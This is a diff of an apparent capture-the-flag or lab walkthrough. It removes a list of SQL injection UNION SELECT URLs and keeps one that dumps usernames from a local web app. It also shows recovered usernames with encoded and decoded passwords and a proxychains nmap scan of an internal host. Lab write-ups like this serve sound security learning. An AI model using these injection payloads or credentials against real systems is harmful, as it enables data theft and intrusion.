@@ -130,18 +130,6 @@ ________________________________________________________________________________
 ______________________________________________________________________________________________________________
 ## Once we get the output which will be the entire database we can now narrow the search
 ### By doing this we can view any data inside we want based on the filters below 1,3,2
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,name FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT account,3,category FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT description,3,2 FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,quantity FROM siteusers.net_products
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT product,3,price FROM siteusers.net_products
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,quantity FROM siteusers.purchase_history
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT product,3,account FROM siteusers.purchase_history
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,ordernumber FROM siteusers.shippingdates
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT account,3,date FROM siteusers.shippingdates
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT user_id,3,name FROM siteusers.users
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT username,3,2 FROM siteusers.users
-All possible combo's the last one is the most promising ;)
 
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT username,3,user_id FROM siteusers.users
 ______________________________________________________________________________________________________________
@@ -150,7 +138,7 @@ ________________________________________________________________________________
     Aaron    ncnffjbeqlCn$$jbeq            apasswordyPa$$word
     user2    RntyrfVfNER78                 EaglesIsARE78
     user3    Obo4GURRnccyrf                Bob4THEEapples
-    Lroth    anotherpassword4THEages       nabgurecnffjbeq4GURntrf #this one wasn't encoded
+    Lroth    anotherpassword4THEages       #this one wasn't encoded
 ______________________________________________________________________________________________________________
 ## NONE OF THE SSH ABOVE WORKS
 ### So take your happy ass back to the first box and scan that network ;)
@@ -161,7 +149,7 @@ ________________________________________________________________________________
 64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.122 ms
 ```
 ______________________________________________________________________________________________________________
-## Scan the new device NOT THE ROUTER .190
+## Scan the new device .172 (NOT THE ROUTER .190)
 ### Hating my life right now, nc to validate the ports/test them
     proxychains nmap -T4 -Pn 192.168.28.172 -p-
 ```
